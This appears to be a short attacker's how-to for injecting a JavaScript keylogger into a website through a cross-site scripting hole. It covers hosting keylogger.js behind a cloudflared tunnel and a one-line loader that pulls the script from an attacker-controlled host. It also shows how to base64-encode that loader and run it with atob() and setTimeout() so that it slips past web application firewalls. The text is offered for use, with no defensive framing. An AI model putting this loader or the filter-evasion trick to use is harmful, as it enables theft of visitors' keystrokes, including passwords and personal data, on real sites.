1. Make a cloudflared tunneling in your terminal for public keylogger.js host with ssl certificate or if you have your own ssl web server you can use it

2. Use this JS to call the keylogger script

var a=document.createElement("script");a.src="https://[your webserver or cloudflare tunnel]/keylogger.js";document.body.appendChild(a); </br>

4. Make this js to base64 for waf bypass

5. Add this to your xss payload with setTimeout() and atob()

6. atob() is used for base64 js execution and setTimeout() is used for waf bypass execution instead of eval()
